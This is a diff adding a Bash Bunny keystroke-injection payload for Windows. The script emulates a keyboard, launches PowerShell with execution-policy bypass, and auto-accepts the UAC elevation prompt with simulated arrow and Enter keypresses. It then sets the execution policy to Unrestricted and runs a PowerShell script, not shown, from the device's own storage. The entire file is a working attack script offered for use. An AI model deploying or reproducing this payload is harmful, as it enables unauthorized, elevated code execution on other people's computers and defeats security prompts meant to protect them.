@@ -1,0 +1,44 @@
+#!/bin/bash
+#
+# Title:            Velo Running Loves
+# Original Author:  Velocity_carbon
+# Version:          1.5
+# Target:           Windows
+# Time :            50s
+
+
+#options
+WINRTYPE="Powershell -nop -ex Bypass Start-Process powershell -Verb runAs"
+PW=".((gwmi win32_volume -f 'label=''BASHBUNNY''').Name+'payloads\switch1\veloauto.ps1')"
+UP="Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted"
+ATTACKMODE HID STORAGE
+Q DELAY 5000
+Q GUI d
+Q DELAY 1000
+Q GUI r
+Q DELAY 2000
+Q STRING $WINRTYPE 
+Q DELAY 2000
+Q ENTER
+Q DELAY 10000
+Q LEFTARROW
+Q DELAY 1000
+Q ENTER
+Q DELAY 10000
+Q STRING $UP
+Q DELAY 3000
+Q ENTER
+Q STRING y
+Q DELAY 100
+Q ENTER
+Q STRING $PW
+Q DELAY 2000
+Q ENTER
+Q DELAY 10000
+Q STRING exit
+Q DELAY 1000
+Q ENTER
+Q DELAY 100
+LED B 500
+LED G 0
+LED FINISH
